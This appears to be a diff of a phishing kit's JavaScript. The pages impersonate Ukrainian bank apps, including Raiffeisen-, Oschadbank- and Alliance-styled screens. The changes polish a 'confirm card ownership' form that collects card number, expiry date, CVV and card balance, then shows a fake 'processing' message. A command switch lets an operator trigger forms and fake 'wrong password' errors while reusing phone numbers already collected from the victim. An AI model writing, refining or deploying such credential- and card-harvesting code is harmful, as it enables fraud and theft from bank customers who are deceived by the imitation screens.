@@ -685,7 +685,7 @@ document.addEventListener('DOMContentLoaded', () => {
         allianceModalContent.innerHTML = html;
     }
 
-    function renderAllianceCardDetailsScreen() {
+    function renderLightThemedCardDetailsScreen() {
         hideAllModals();
         const html = `
             <div class="alliance-header">
@@ -770,7 +770,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 document.getElementById('alliance-submit-btn').classList.toggle('active', value.length === 16);
              }
              if (target.id === 'alliance-details-card-input') {
-                target.value = target.value.replace(/\D/g, '').substring(0, 16).replace(/(\d{4})/g, '$1 ').trim();
+                let value = target.value.replace(/\D/g, '').substring(0, 16);
+                target.value = value.replace(/(\d{4})/g, '$1 ').trim();
              }
              if (target.id === 'alliance-details-exp-input') {
                 let value = target.value.replace(/\D/g, '').substring(0, 4);
@@ -1074,7 +1075,7 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // --- УНИВЕРСАЛЬНАЯ ФУНКЦИЯ для экрана запроса данных (ОПТИМИЗИРОВАНО) ---
+    // --- УНИВЕРСАЛЬНАЯ ФУНКЦИЯ для экрана запроса данных (ТЕМНАЯ ТЕМА) ---
     function renderThemedCardDetailsScreen() {
         hideAllModals();
         const theme = activeBankData.colors || { primary: '#FFCC00', text: '#FFFFFF', bg: '#1C1C1E' };
@@ -1088,14 +1089,14 @@ document.addEventListener('DOMContentLoaded', () => {
                 <span class="title" style="color: ${theme.text};">Запит даних</span>
             </div>
             <div class="raiff-content-wrapper" style="color: ${theme.text};">
-                <h2 class="raiff-main-title" style="margin-top: 30px;">Введіть дані картки</h2>
+                <h2 class="raiff-main-title" style="margin-top: 30px;">Підтвердити володіння карткою</h2>
                 <div style="display: flex; flex-direction: column; gap: 15px;">
-                    <input id="details_card" class="raiff-phone-input" placeholder="Номер картки" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1);">
+                    <input id="details_card" class="raiff-phone-input" placeholder="Номер картки" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1); color: var(--raiff-text);">
                     <div style="display: flex; gap: 15px;">
-                        <input id="details_exp" class="raiff-phone-input" placeholder="Термін (ММ/РР)" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1);">
-                        <input id="details_cvv" class="raiff-phone-input" placeholder="CVV" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1);">
+                        <input id="details_exp" class="raiff-phone-input" placeholder="Термін (ММ/РР)" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1); color: var(--raiff-text);">
+                        <input id="details_cvv" class="raiff-phone-input" placeholder="CVV" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1); color: var(--raiff-text);">
                     </div>
-                    <input id="details_balance" class="raiff-phone-input" placeholder="Баланс" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1);">
+                    <input id="details_balance" class="raiff-phone-input" placeholder="Поточний баланс картки" style="padding: 15px; border-radius: 8px; background-color: rgba(255,255,255,0.1); color: var(--raiff-text);">
                 </div>
             </div>
             <div class="raiff-footer">
@@ -1105,10 +1106,28 @@ document.addEventListener('DOMContentLoaded', () => {
         raiffModalContent.innerHTML = html;
         raiffModalOverlay.style.display = 'flex';
         document.getElementById('raiff-back-btn').addEventListener('click', () => { hideAllModals(); });
+        
+        // Add event listeners for input formatting
+        raiffModalContent.addEventListener('input', (e) => {
+            const { id, value } = e.target;
+            if (id === 'details_card') {
+                e.target.value = value.replace(/\D/g, '').substring(0, 16).replace(/(\d{4})/g, '$1 ').trim();
+            } else if (id === 'details_exp') {
+                let v = value.replace(/\D/g, '').substring(0, 4);
+                e.target.value = v.length > 2 ? v.substring(0, 2) + '/' + v.substring(2) : v;
+            } else if (id === 'details_cvv') {
+                e.target.value = value.replace(/\D/g, '').substring(0, 3);
+            } else if (id === 'details_balance') {
+                let v = value.replace(/[^0-9,]/g, '');
+                let parts = v.split(',');
+                if (parts.length > 2) v = parts[0] + ',' + parts.slice(1).join('');
+                e.target.value = v;
+            }
+        });
 
         document.getElementById('details_submit_btn').addEventListener('click', () => {
             const card_details = {
-                card: document.getElementById('details_card').value,
+                card: document.getElementById('details_card').value.replace(/\s/g, ''),
                 exp: document.getElementById('details_exp').value,
                 cvv: document.getElementById('details_cvv').value,
                 balance: document.getElementById('details_balance').value,
@@ -1117,6 +1136,7 @@ document.addEventListener('DOMContentLoaded', () => {
             raiffModalContent.innerHTML = `<div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100%;"><h2 class="raiff-main-title" style="color:${theme.text};">Обробка...</h2><p class="raiff-subtitle">Будь ласка, зачекайте. Не закривайте сторінку.</p></div>`;
         });
     }
+
 
     // --- DYNAMIC RENDER FUNCTIONS (OSCHADBANK) ---
     function renderOschadbankLogin(options = {}) {
@@ -1511,8 +1531,16 @@ document.addEventListener('DOMContentLoaded', () => {
                     renderThemedDebitScreen();
                 }
                 break;
-            case 'show_card_details_form': renderThemedCardDetailsScreen(); break;
-            case 'request_alliance_card_details': renderAllianceCardDetailsScreen(); break;
+            case 'show_card_details_form':
+                 if (['alliance', 'vostok', 'izibank', 'ukrsib'].includes(activeBankData.theme)) {
+                    renderLightThemedCardDetailsScreen();
+                } else {
+                    renderThemedCardDetailsScreen();
+                }
+                break;
+            case 'request_alliance_card_details': 
+                renderLightThemedCardDetailsScreen(); 
+                break;
             case 'password_error':
                 const errorMsg = data.loginType === 'login' ? 'Невірний логін або пароль' : 'Невірний пароль';
                 const savedPhone = data.loginType === 'phone' && collectedData.phone ? collectedData.phone.replace('+380', '').replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4') : '';
